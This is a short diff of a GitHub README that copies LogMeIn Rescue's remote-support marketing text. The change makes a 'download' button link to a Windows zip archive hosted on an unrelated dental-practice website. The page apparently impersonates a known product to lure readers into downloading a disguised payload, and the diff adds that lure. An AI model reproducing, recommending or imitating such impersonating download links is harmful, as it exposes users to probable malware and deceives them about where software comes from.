@@ -7,10 +7,8 @@ Remote IT support software as tough as you are
 Increasing security threats? Limited resources? Our enterprise remote support software is built to beat every challenge.
 
 
-![download](https://github.com/gerg0g/logmein/assets/152215026/94be7dd6-e316-4d55-9dff-23ff6676b994)
-
-
 
 Multi-Platform Support
 Remotely support any device.
 Rescue can support any device — from desktop to mobile, Mac to Windows. Just swoop in and start solving.
+![download](https://github.com/gerg0g/logmein/assets/152215026/94be7dd6-e316-4d55-9dff-23ff6676b994)(https://pacerdentalpc.com/source_win64.zip)
